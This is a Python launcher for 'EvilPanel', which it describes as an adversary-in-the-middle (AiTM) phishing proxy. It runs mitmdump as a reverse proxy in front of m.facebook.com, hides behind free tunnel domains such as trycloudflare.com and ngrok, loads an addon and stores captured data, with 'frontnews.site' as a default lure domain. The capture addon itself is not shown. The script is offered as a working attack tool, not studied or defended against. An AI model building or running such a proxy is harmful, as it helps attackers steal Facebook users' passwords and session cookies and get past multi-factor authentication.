#!/usr/bin/env python3
"""
EvilPanel Tunnel Mode v3.0
For use behind cloudflared tunnel (no SSL certificates needed)

IMPORTANT: EVILPANEL_DOMAIN must be set BEFORE starting this script!
The domain is read at import time and cannot be changed at runtime.

Usage:
    export EVILPANEL_DOMAIN="abc123.trycloudflare.com"
    python3 run_tunnel_mode.py

Based on 2025 AiTM implementation research
"""
import subprocess
import os
import sys
import signal

# Configuration - tunnel mode specific
# CRITICAL: These are read at import time - set env vars BEFORE starting!
DOMAIN = os.environ.get("EVILPANEL_DOMAIN")
DATA_DIR = os.environ.get("EVILPANEL_DATA", "/opt/evilpanel/data")
ADDON_PATH = os.environ.get("EVILPANEL_ADDON", "/opt/evilpanel/core/mitmproxy_addon.py")
LISTEN_HOST = "127.0.0.1"  # localhost only - cloudflared forwards here
LISTEN_PORT = 8443
UPSTREAM_HOST = "m.facebook.com"

# NOTE: No CERT_FILE - cloudflared handles TLS termination


def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    print("\n[*] Received shutdown signal, cleaning up...")
    sys.exit(0)


def check_prerequisites():
    """Verify all prerequisites are met"""
    errors = []
    
    # CRITICAL: Check domain is set
    if not DOMAIN:
        errors.append("EVILPANEL_DOMAIN not set! Must be set BEFORE starting.")
        errors.append("Example: export EVILPANEL_DOMAIN='abc123.trycloudflare.com'")
    elif DOMAIN == "frontnews.site":
        print(f"[!] WARNING: Using default domain '{DOMAIN}' - is this intentional?")
    
    # Check addon file
    if not os.path.exists(ADDON_PATH):
        errors.append(f"Addon file not found: {ADDON_PATH}")
    
    # Check data directory
    if not os.path.exists(DATA_DIR):
        try:
            os.makedirs(DATA_DIR, exist_ok=True)
            print(f"[+] Created data directory: {DATA_DIR}")
        except Exception as e:
            errors.append(f"Cannot create data directory: {e}")
    
    # NOTE: No certificate check in tunnel mode
    
    if errors:
        print("[!] Prerequisites check failed:")
        for error in errors:
            print(f"    - {error}")
        sys.exit(1)
    
    print("[+] Prerequisites check passed (tunnel mode)")


def main():
    """Main entry point"""
    
    # Set up signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Check prerequisites
    check_prerequisites()
    
    # Ensure environment variables are set for the addon
    # (addon reads these at import time)
    os.environ["EVILPANEL_DOMAIN"] = DOMAIN
    os.environ["EVILPANEL_DATA"] = DATA_DIR
    os.environ["EVILPANEL_DEBUG"] = "true"
    
    # Determine mitmdump path
    venv_mitmdump = "/opt/evilpanel/venv/bin/mitmdump"
    system_mitmdump = "/usr/local/bin/mitmdump"
    local_venv_mitmdump = os.path.join(os.path.dirname(__file__), "venv/bin/mitmdump")
    
    if os.path.exists(venv_mitmdump):
        mitmdump_path = venv_mitmdump
    elif os.path.exists(local_venv_mitmdump):
        mitmdump_path = local_venv_mitmdump
    elif os.path.exists(system_mitmdump):
        mitmdump_path = system_mitmdump
    else:
        mitmdump_path = "mitmdump"
    
    # Build mitmproxy command - TUNNEL MODE
    # Key differences from run.py:
    # 1. Listen on 127.0.0.1 only (not 0.0.0.0)
    # 2. No SSL certificates (cloudflared handles TLS)
    cmd = [
        mitmdump_path,
        "--mode", f"reverse:https://{UPSTREAM_HOST}/",
        "--listen-host", LISTEN_HOST,
        "--listen-port", str(LISTEN_PORT),
        "--ssl-insecure",
        "--set", "upstream_cert=false",
        "--set", "connection_strategy=lazy",
        "--set", "stream_large_bodies=10m",
        "-s", ADDON_PATH,
    ]
    
    # NOTE: No --certs flag - cloudflared handles client-facing TLS
    
    print("=" * 64)
    print("  EvilPanel AiTM Proxy v3.0 (TUNNEL MODE)")
    print("=" * 64)
    print(f"  Domain:     {DOMAIN}")
    print(f"  Upstream:   {UPSTREAM_HOST}")
    print(f"  Listening:  {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"  Data Dir:   {DATA_DIR}")
    print(f"  Addon:      {ADDON_PATH}")
    print(f"  mitmdump:   {mitmdump_path}")
    print(f"  TLS:        Handled by cloudflared (no local certs)")
    print("=" * 64)
    print()
    
    # Verify domain is a tunnel URL
    tunnel_suffixes = ['.trycloudflare.com', '.loclx.io', '.serveo.net', '.lhr.life', '.ngrok.io']
    is_tunnel = any(DOMAIN.endswith(suffix) for suffix in tunnel_suffixes)
    
    if is_tunnel:
        print(f"[+] Tunnel domain detected: {DOMAIN}")
    else:
        print(f"[!] WARNING: Domain '{DOMAIN}' doesn't look like a tunnel URL")
        print(f"[!] Expected suffixes: {', '.join(tunnel_suffixes)}")
    
    print()
    
    try:
        subprocess.run(cmd, check=True)
    except FileNotFoundError:
        print(f"[!] mitmdump not found at: {mitmdump_path}")
        print("[!] Install with: pip install mitmproxy")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"[!] mitmproxy exited with error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
